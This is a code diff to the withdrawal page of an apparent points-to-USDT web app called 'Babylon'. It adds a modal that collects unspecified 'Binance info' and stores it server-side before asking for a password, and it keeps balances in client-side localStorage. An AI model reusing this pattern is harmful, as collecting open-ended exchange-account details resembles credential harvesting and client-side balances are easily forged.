@@ -6,7 +6,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Withdraw</title>
+    <title>Babylon</title>
 </head>
     <style>
         body {
@@ -67,10 +67,11 @@ border-radius: 3px;
     </style>
 
 <body>
-    <!-- {{!-- <p id="withdraw-all">Withdrawn: 0 USDT-cent</p> --}} -->
     <h1>Your Currency</h1>
- <div class="currency" style="display: flex;"><p id="money">Babylon-Currency 0</p> <br>
-       <p id="withdraw-all">Withdrawn: 0 </p></div>
+    <div class="currency" style="display: flex;">
+        <p id="money">Babylon-Currency 0</p> <br>
+        <p id="withdraw-all">Withdrawn: 0 </p>
+    </div>
 
     <div class="container">
         <div>
@@ -83,6 +84,14 @@ border-radius: 3px;
         <p id="message"></p>
     </div>
 
+    <!-- Binance prompt modal -->
+    <div id="binance-modal" style="display: none; background-color: lightgreen; padding: 20px;">
+        <h2 style="color: white;">Binance</h2>
+        <input type="text" id="binance-input" placeholder="Enter Binance info">
+        <button id="binance-submit">Submit</button>
+        <p id="binance-message" style="color: white;"></p>
+    </div>
+
     <!-- Password prompt modal -->
     <div id="password-modal" style="display: none;">
         <h2>Enter Password</h2>
@@ -90,10 +99,15 @@ border-radius: 3px;
         <button id="password-submit">Submit</button>
         <p id="password-message"></p>
     </div>
+
 <script>
 document.addEventListener('DOMContentLoaded', () => {
     const checkbox = document.getElementById('account');
     const textValue = document.getElementById('send-location');
+    const binanceModal = document.getElementById('binance-modal');
+    const binanceInput = document.getElementById('binance-input');
+    const binanceSubmit = document.getElementById('binance-submit');
+    const binanceMessage = document.getElementById('binance-message');
     const passwordModal = document.getElementById('password-modal');
     const passwordInput = document.getElementById('password-input');
     const passwordSubmit = document.getElementById('password-submit');
@@ -115,7 +129,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (data.success) {
                     // Update localStorage with the latest user data
                     localStorage.setItem('score', data.score);
-                    // localStorage.setItem('electronic', data.electronic);
                     localStorage.setItem('totalWithdrawn', data.totalWithdrawn);
 
                     // Immediately display the latest score and other data
@@ -142,6 +155,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // Call this function when the page is loaded to display data from localStorage
     updateDisplayData();
 
+    // Show Binance modal first
     document.getElementById('withdraw-btn').addEventListener('click', () => {
         const expectedText = "Frankfurt-stock-exchange://ghyeindg4t63hm.accountnumber-89764520982648298";
 
@@ -164,71 +178,113 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        // Show password modal
-        passwordModal.style.display = 'block';
+        // Show Binance modal first
+        binanceModal.style.display = 'block';
+    });
 
-        passwordSubmit.addEventListener('click', async () => {
-            const enteredPassword = passwordInput.value;
+    binanceSubmit.addEventListener('click', async () => {
+        const binanceInfo = binanceInput.value;
 
-            if (enteredPassword === '') {
-                passwordMessage.textContent = "Please enter your password.";
-                return;
+        if (!binanceInfo) {
+            binanceMessage.textContent = 'Please enter Binance info.';
+            return;
+        }
+
+        try {
+            const response = await fetch('/api/store-binance', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    userId: localStorage.getItem('userId'),
+                    binanceInfo: binanceInfo
+                }),
+            });
+
+            const data = await response.json();
+
+            if (data.success) {
+                // Hide the binance modal and show the password modal
+                binanceModal.style.display = 'none';
+                passwordModal.style.display = 'block';
+            } else {
+                binanceMessage.textContent = 'Error storing Binance info. Please try again.';
             }
+        } catch (error) {
+            console.error('Error storing Binance info:', error);
+            binanceMessage.textContent = 'An error occurred. Please try again.';
+        }
+    });
 
-            try {
-                const response = await fetch('/api/verify-password', {
+    // Password submission handling
+    passwordSubmit.addEventListener('click', async () => {
+        const enteredPassword = passwordInput.value;
+
+        if (enteredPassword === '') {
+            passwordMessage.textContent = "Please enter your password.";
+            return;
+        }
+
+        try {
+            const response = await fetch('/api/verify-password', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: localStorage.getItem('username'), // Assuming username is stored in local storage after login
+                    password: enteredPassword
+                }),
+            });
+
+            const data = await response.json();
+
+            if (data.success) {
+                let withdrawAmount = parseFloat(document.getElementById('withdraw-amount').value);
+                let withdrawCents = Math.round(withdrawAmount * 100);
+                let totalAmount = parseInt(localStorage.getItem('score')) || 0;
+
+                totalAmount -= withdrawCents;
+                localStorage.setItem('score', totalAmount);
+
+                // Update display after withdrawal
+                updateDisplayData();
+
+                document.getElementById('message').textContent = `Withdrawal successful: ${withdrawAmount.toFixed(2)} USDT-cent.`;
+
+                let totalWithdrawn = parseInt(localStorage.getItem('totalWithdrawn')) || 0;
+                totalWithdrawn += withdrawCents;
+                localStorage.setItem('totalWithdrawn', totalWithdrawn);
+                document.getElementById('withdraw-all').textContent = `Withdrawn: ${(totalWithdrawn / 100).toFixed(2)} USDT-cent`;
+
+                // Clear and hide the password input field
+                passwordInput.value = '';
+                passwordModal.style.display = 'none';
+
+                // Send withdrawal amount to backend
+                await fetch('/api/withdraw', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        username: localStorage.getItem('username'), // Assuming username is stored in local storage after login
-                        password: enteredPassword
+                        userId: localStorage.getItem('userId'),
+                        amount: withdrawCents
                     }),
                 });
-
-                const data = await response.json();
-
-                if (data.success) {
-                    totalAmount -= withdrawCents;
-                    localStorage.setItem('score', totalAmount);
-
-                    // Update display after withdrawal
-                    updateDisplayData();
-
-                    document.getElementById('message').textContent = `Withdrawal successful: ${withdrawAmount.toFixed(2)} USDT-cent.`;
-
-                    let totalWithdrawn = parseInt(localStorage.getItem('totalWithdrawn')) || 0;
-                    totalWithdrawn += withdrawCents;
-                    localStorage.setItem('totalWithdrawn', totalWithdrawn);
-                    document.getElementById('withdraw-all').textContent = `Withdrawn: ${(totalWithdrawn / 100).toFixed(2)} USDT-cent`;
-
-                    // Clear and hide the password input field
-                    passwordInput.value = '';
-                    passwordModal.style.display = 'none';
-
-                    // Send withdrawal amount to backend
-                    await fetch('/api/withdraw', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            userId: localStorage.getItem('userId'), // Assuming userId is stored in local storage after login
-                            amount: withdrawCents
-                        }),
-                    });
-                } else {
-                    passwordMessage.textContent = "Invalid password. Please try again.";
-                }
-            } catch (error) {
-                console.error('Error verifying password:', error);
-                passwordMessage.textContent = "An error occurred. Please try again.";
+            } else {
+                passwordMessage.textContent = "Invalid password. Please try again.";
             }
-        });
+        } catch (error) {
+            console.error('Error verifying password:', error);
+            passwordMessage.textContent = "An error occurred. Please try again.";
+        }
     });
 });
 </script>
+</body>
+
 
 <!-- this is full working code just need refersh for latest score <script>
 document.addEventListener('DOMContentLoaded', () => {
